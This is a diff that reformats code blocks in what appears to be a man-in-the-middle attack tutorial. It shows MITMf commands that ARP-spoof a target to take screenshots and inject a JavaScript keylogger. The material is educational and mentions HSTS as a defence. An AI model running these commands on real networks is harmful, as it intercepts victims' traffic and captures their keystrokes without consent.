@@ -165,11 +165,12 @@ Hence, when trying to prevent this type of attack make sure that you have `HSTS`
 * Taking screenshots 
 ```shell
     root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --screen
-    ```
-*  Injecting Key Logger
+```
+
+* Injecting Key Logger
 ```shell
     root@kali:~/MITMf# python mitmf.py --arp --spoof --gateway 10.0.2.1 --target 10.0.2.4 -i eth0 --jskeylogger
-    ```
+```
     
     
 There are several more, you can run `python mitmf.py` to get the help
